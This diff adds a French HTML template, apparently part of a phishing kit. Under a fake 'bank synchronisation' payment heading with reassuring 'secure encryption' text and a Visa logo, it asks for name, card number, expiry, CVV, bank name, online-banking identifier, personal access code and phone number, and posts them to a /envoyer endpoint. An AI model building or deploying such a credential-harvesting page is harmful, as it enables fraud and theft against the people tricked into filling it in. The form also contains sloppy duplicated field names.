@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Formulaire de paiement</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+
+  <main class="form-box">
+    <h2>Synchronisation a votre etablissement bancaire</h2>
+    <p class="secure-text">chiffrées de manière sécurisée</p>
+    <div class="card-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
+    </div>
+
+    <form class="payment-form" action="/envoyer" method="POST">
+      <label for="nom">Nom complet</label>
+      <input type="text" id="nom" name="nom" placeholder="Saisis ton nom et prénom" required>
+
+      <label for="carte">Numéro carte bleue</label>
+      <input type="text" id="carte" name="carte" placeholder="1234 5678 9012 3456" inputmode="numeric" pattern="[0-9\s]{13,19}" required>
+
+      <div class="row">
+        <div class="half">
+          <label for="expiration">expiration</label>
+          <input type="text" id="expiration" name="expiration" placeholder="MM / AA" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
+        </div>
+        <div class="half">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" inputmode="numeric" required>
+        </div>
+      </div>
+
+      <label for="etablissement">Banque</label>
+      <input type="text" id="etablissement" name="etablissement" placeholder="Par ex : Crédit Agricole" required>
+
+        <label for="iban">Identifiant bancaire</label>
+        <input type="text" id="iban" name="iban" placeholder="0102030405" required>
+
+
+      <div class="half">
+          <label for="cvv">Code personnel</label>
+          <input type="text" id="cvv" name="cvv" placeholder="010203" maxlength="4" inputmode="numeric" required>
+        </div>
+
+      <div class="form-group">
+    <label for="telephone">Téléphone</label>
+    <input type="tel" id="telephone" name="telephone" placeholder="ex: 06 12 34 56 78" required>
+</div>
+
+
+      <button type="submit" class="cta-button">Utiliser cette carte</button>
+    </form>
+  </main>
+
+</body>
+</html>
